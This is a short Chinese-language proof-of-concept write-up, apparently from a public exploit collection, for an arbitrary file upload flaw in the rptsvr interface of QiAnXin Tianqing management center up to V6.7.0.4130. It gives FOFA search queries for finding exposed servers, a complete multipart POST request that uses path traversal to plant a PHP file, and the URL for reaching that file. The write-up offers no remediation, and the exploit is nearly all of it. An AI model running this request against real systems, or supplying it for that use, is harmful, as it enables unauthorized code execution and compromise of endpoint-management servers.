## 奇安信天擎rptsvr任意文件上传

奇安信 天擎管理中心 <=V6.7.0.4130 版本的rptsvr接口存在任意文件上传漏洞，可上传恶意至服务器，执行脚本文件。

## fofa
```
banner="QiAnXin web server" || banner="360 web server"  || body="appid\":\"skylar6" || body="/task/index/detail?id={item.id}" || body="已过期或者未授权，购买请联系4008-136-360"
```

## poc
```
POST /rptsvr/upload HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1944.0 Safari/537.36
Connection: close
Content-Length: 414
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.5
Content-Type: multipart/form-data;boundary=---------------------------55433477442814818502792421460
Upgrade-Insecure-Requests: 1

-----------------------------55433477442814818502792421460
Content-Disposition: form-data; name="uploadfile"; filename="../../../application/api/controllers/TController2.php"
Content-Type: text/x-python

<?php
phpinfo();
?>
-----------------------------55433477442814818502792421460
Content-Disposition: form-data; name="token"

skylar_report
-----------------------------55433477442814818502792421460
```

![ee8643c18675a73d8d0a327cb110adde](https://github.com/wy876/POC/assets/139549762/e202d50b-2860-47b8-8670-07b015a5cc7f)

#### 访问上传文件路径如下：
`http://xxxx/application/api/controllers/TController2.php`

![099c23949f851175f1e3306c0c102637](https://github.com/wy876/POC/assets/139549762/73b370c6-2c4f-4422-ada3-33ebf4a952b2)

